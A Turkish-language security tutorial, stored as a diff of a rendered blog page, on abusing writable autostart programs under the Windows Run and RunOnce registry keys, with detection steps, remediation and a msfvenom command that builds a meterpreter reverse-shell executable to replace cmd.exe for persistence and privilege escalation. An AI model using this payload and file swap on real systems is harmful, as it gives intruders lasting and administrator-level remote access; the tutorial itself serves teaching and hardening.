@@ -1,0 +1,148 @@
+I"�'<h2 id="özet">Özet</h2>
+
+<p>Windows Kayıt Defteri (Registery), yüklü programlar ve donanımlar için bilgiler, ayarlar, seçenekler ve diğer değerleri tutar. Kayıt defterini, işletim sistemi çekirdeği, aygıt sürücüleri, hizmetler, hesap yöneticisi ve kullanıcı arabiriminin tümü kullanabilir.</p>
+
+<p>İşletim sisteminin içine bu kadar yerleşmiş bir araç kötü niyetli kullanımla işletim sisteminin işleyişinde ciddi değişikliklere yol açabilmektedir.</p>
+
+<h2 id="detaylı-bilgi">Detaylı Bilgi</h2>
+
+<p>Windows her oturum açılışında istenen dosyaların otomatik olarak başlatılmasını sağlayan bir özelliği vardır. Bu özelliği kayıt defteri üzerinden gerçekeştirmek için Run ve RunOnce kayıtlarına, çalıştırılması istenen dosya yolu verilecek şekilde anahtar girilmelidir.
+Aşağıda ki kayıtlar içerisine anahtar girilerek istenen dosyalar her oturum açılışında çaıştırılabilir.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
+HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
+HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce
+</code></pre></div></div>
+
+<p>Her oturum açılışında otomatik dosya çalıştırma Windows’un sağladığı bir özelliktir. Ancak yanlış yapılandırılmış ise kötü niyetli kişiler tarafından istismar edilebilir. Eğer ki sisteme erişimi olan kötü niyetli kişi, otomatik başlatılan bu dosyaları değiştirme ayrıcalıklarına sahipse ilgili dosyanın yerine kendi zararlı yazılımını yerleştirerek, zararlının her oturum açılışında çalıştırılmasını sağlayacaktır. Elde ettiği erişim de, oturum açan kullanıcının ayrıcalıklarına sahip olacaktır. Bu yöntem hem hak yükseltme yöntemi hem de sistemde kalıcı olma yöntemi olarak kullanılabilmektedir.</p>
+
+<h2 id="bulunması">Bulunması</h2>
+
+<p>Masaüstünde bulunan CMD.exe uygulamasının oturum açıldığında otomatik olarak başlayacağı senaryoyu inceleyelim. Yanlış yapılandırma sonucunu otomatik olarak bulmak için DazzleUp’ı kullanabiliriz. Çıktı incelendiğinde hangi kayıt defteri anahtarı ve hangi dosya olduğu görünmektedir. DazzleUp’ın verdiği ekran görüntüsü aşağıdadır.</p>
+
+<p align="center">
+	<img src="/images/mod_bin_save_autoun_ss/1.png" alt="" />
+</p>
+
+<p>İlgili kayıt, kayıt defterinde arandığında aşağıdaki gibi gözükmektedir.</p>
+
+<p align="center">
+	<img src="/images/mod_bin_save_autoun_ss/2.png" alt="" />
+</p>
+
+<p>Eğer manuel olarak test edilmesi gerekirse ilk adımda hangi uygulamaların başlangıç uygulaması olduğuna bakılmalı. Başlangıç uygulamalarının tespiti için;</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
+reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
+reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
+reg query HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce
+</code></pre></div></div>
+
+<p>komutları <strong>cmd</strong> ya da <strong>powershell</strong> üzerinden çalıştırılabilir. Örnek çıktı aşağıda verilmiştir.</p>
+
+<p align="center">
+	<img src="/images/mod_bin_save_autoun_ss/3.png" alt="" />
+</p>
+
+<p><strong>NOT:</strong> HKCU o an ki kullanıcıyı etkileyecektir. HKLM tüm makineyi etkileyecektir. Run her oturum açılışında çalıştırmaya devam edecek. RunOnce ise bir seferlik çalışmasını sağlayacaktır.</p>
+
+<p>Bulunan başlangıç uygulamaları üzerinde değişiklik yapma izninin olup olmadığı araştırılmalıdır. Bunun için <strong>icacls.exe</strong> kullanılabilir.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">icacls.exe</span><span class="w"> </span><span class="s2">"C:\Users\test\Desktop\cmd.exe"</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Uygulamanın <strong>test</strong> kullanıcısı tarafından değiştirilebilir olduğu aşağıda ki ekran görüntüsünde gösterilmiştir.</p>
+
+<p align="center">
+	<img src="/images/mod_bin_save_autoun_ss/4.png" alt="" />
+</p>
+
+<p><strong>NOT:</strong> Icacls size <strong>F</strong> (Full), <strong>M</strong> (Modify), <strong>RX</strong> (Read and Executable), <strong>R</strong> (Readonly), <strong>W</strong> (Writeonly) kısaltılmış olmak üzere bilgi verir.
+Ayrıca dosyanın <strong>Güvenlik</strong> ayarları da kullanılabilir.</p>
+
+<p align="center">
+	<img src="/images/mod_bin_save_autoun_ss/5.png" alt="" />
+</p>
+
+<p>Bu hali ile cmd.exe dosyası test kullanıcısı tarafından değiştirilebilir olduğu için sistemde test kullanıcısı ile elde edilmiş bir oturum var ise bu dosya başka bir zararlı yazılım ile aynı isimde olacak şekilde değiştirilebilir. Bu sağlandığında her oturum açılışında tekrar bir oturum elde edilecektir. Elde edilen uzak erişim, hangi kullanıcı oturum açtı ise o kullanıcı üzerinden elde edilmiş olacaktır. Eğer Administrator kulllanıcısı ile oturum açılırsa sistemde Administrator kullanıcısı üzerinden bir uzak erişim elde edilecektir.</p>
+
+<h2 id="i̇stismar-edilmesi">İstismar Edilmesi</h2>
+
+<p>Zararlı yazılım üretilerek sisteme ilgili dosyanın yerine yerleştirilecektir. Bunun için ilk adımda zararlı üretilecektir. Zararlının üretildiğine dair ekran görüntüsü aşağıda verilmiştir.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">--platform</span> windows <span class="nt">-a</span> x64 <span class="nt">-p</span> windows/x64/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.6.182 <span class="nv">LPORT</span><span class="o">=</span>445 <span class="nt">-f</span> exe <span class="nt">-o</span> cmd.exe
+</code></pre></div></div>
+<p align="center">
+	<img src="/images/mod_bin_save_autoun_ss/6.png" alt="" />
+</p>
+
+<p>İlgili dosyanın hedef makineye daha önceden elde edilmiş bir oturum üzerinden yüklenmesine dair ekran görüntüsü aşağıda verilmiştir.</p>
+
+<p align="center">
+	<img src="/images/mod_bin_save_autoun_ss/7.png" alt="" />
+</p>
+
+<p>Administrator kullanıcısı oturum açtığında elde edilecek oturum Administrator kullanıcısı ayrıcalıklarında olacaktır. Böylece hak yükseltme yapılabilecektir. Eğer başka kullanıcı oturum açarsa elde edilecek oturum o kullanıcının ayrıcalıklarında olacaktır. <strong>Administrator</strong> kullanıcısı oturum açtığında elde edilen oturumun ekran görüntüsü aşağıdadır.</p>
+
+<p align="center">
+	<img src="/images/mod_bin_save_autoun_ss/8.png" alt="" />
+</p>
+
+<p><strong>NOT:</strong> Dosya kimler tarafından çalıştırılabilir iznine sahipse sadece o kullanıcılardan erişim elde edilebilir. Örnek olarak dosya izinlerine <strong>Everyone</strong> eklenirse her kullanıcı bu dosyayı çalıştırabileceği için her kullanıcı oturum açtığında oturum elde edilebilir olacaktır. Everyone izinleri açıldığına dair ekran görüntüsü aşağıda verilmiştir.</p>
+
+<p align="center">
+	<img src="/images/mod_bin_save_autoun_ss/9.png" alt="" />
+</p>
+
+<p>Örneğin <strong>user1</strong> kullanıcısının oturum açtığında elde edilen oturum aşağıda gösterilmiştir.</p>
+
+<p align="center">
+	<img src="/images/mod_bin_save_autoun_ss/10.png" alt="" />
+</p>
+
+<h2 id="çözüm">Çözüm</h2>
+
+<p>Mevcut durumu gidermek için eğer başlangıçta dosyanın çalıştırılması gerekiyorsa dosya değiştirme ve çalıştırma izinlerini düzenleyebilirsiniz. Böylelikle sadece istenen kullanıcı oturum açtığında dosya çalışmış olacak.</p>
+
+<p>Bir diğer yöntem ise yanlış yapılandırılmış anahtarları silmek olacaktır ancak Windows’un sağladığı bir özelliği kullanmamak olacaktır. Bunun yerine hatalı yapılandırmaları düzenlemek en mantıklısı olacaktır. Yanlış yapılandırmanın olabileceği kayıtlar;</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
+HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
+HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce
+</code></pre></div></div>
+
+<p>içerisinde bulunabilir.
+Yanlış yapılandırılmış anahtarın temizlendiğine dair ekran görüntüsü aşağıda verilmiştir.</p>
+
+<p align="center">
+	<img src="/images/mod_bin_save_autoun_ss/11.png" alt="" />
+</p>
+
+<p>Hatalı yapılandırmanın giderildiğine dair ekran görüntüsü aşağıda verilmiştir.</p>
+
+<p align="center">
+	<img src="/images/mod_bin_save_autoun_ss/12.png" alt="" />
+</p>
+
+<h2 id="kaynakça">Kaynakça:</h2>
+
+<ul>
+  <li>https://en.wikipedia.org/wiki/Windows_Registry</li>
+  <li>https://docs.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys</li>
+  <li>https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls</li>
+  <li>https://github.com/hlldz/dazzleUP</li>
+</ul>
+:ET
